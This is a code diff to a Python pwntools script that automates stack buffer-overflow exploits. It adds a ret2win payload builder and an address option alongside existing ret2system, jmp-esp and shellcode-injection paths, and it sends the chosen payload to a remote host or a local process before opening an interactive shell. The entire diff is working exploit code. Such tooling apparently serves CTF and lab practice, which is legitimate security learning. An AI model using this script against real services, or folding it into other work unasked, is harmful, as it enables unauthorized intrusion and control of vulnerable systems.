@@ -84,6 +84,18 @@ def ret2system(offset, binary, binary_arch, libc_address, libc_file):
             return payload
     except:
         error("you have to debug by your self, add -d or --debug argument")
+
+def ret2win(offset, binary, binary_arch, win_address):
+    try: 
+        info("win address: %#x", int(win_address,16))
+        if binary_arch == "32bit":
+            payload = b"\x90"*offset + p32(int(win_address,16))
+            return payload
+        else:
+            payload = b"\x90"*offset + p64(int(win_address,16))
+            return payload
+    except:
+        error("you have to debug by your self, add -d or --debug argument")
     
     
 if __name__ == '__main__':
@@ -94,6 +106,8 @@ if __name__ == '__main__':
         parser.add_option("-l", "--libc", dest="libc", help="Add libc file to get bypass NX protection")
         parser.add_option("-d", "--debug", dest="debug", help="Debug flag to attach gdb, and pwntools debug mode", action="store_true")
         parser.add_option("-p", "--pattern", dest="pattern", default=500, help="Enter number of pattern offset (Optional)")
+        parser.add_option("-a", "--address", dest="address", help="Add address to jmp into")
+
         (options, arguments) = parser.parse_args()
 
         # Binary filename
@@ -136,14 +150,18 @@ if __name__ == '__main__':
             
             p = remote(host,port)
 
-            if "enabled" in checksec:
-                payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
-            
+            if options.address:
+                payload = ret2win(offset, binary, binary_arch, options.address)
+
             else:
-                if jmp_esp:
-                    payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                if "enabled" in checksec:
+                    payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
+                
                 else:
-                    error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
+                    if jmp_esp:
+                        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                    else:
+                        error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
             p.sendline(payload)
             p.interactive()
         
@@ -152,6 +170,8 @@ if __name__ == '__main__':
             # Start program
             io = process(binary)
             
+
+
             # Debug Section
             if options.debug:
                 context.log_level = 'debug'
@@ -160,15 +180,19 @@ if __name__ == '__main__':
                 if jmp_esp:
                     gdb_commands += "b *"+str(hex(jmp_esp))
                 gdb.attach(io, gdb_commands)
-
-            if "enabled" in checksec:
-                payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
+            
+            if options.address:
+                payload = ret2win(offset, binary, binary_arch, options.address)
+                
             else:
-                # Find esp Section
-                if jmp_esp:
-                    payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                if "enabled" in checksec:
+                    payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
                 else:
-                    payload = injection_exploit(offset, esp_register, binary_arch)
+                    # Find esp Section
+                    if jmp_esp:
+                        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
+                    else:
+                        payload = injection_exploit(offset, esp_register, binary_arch)
             
             # Send the payload
             io.sendline(payload)
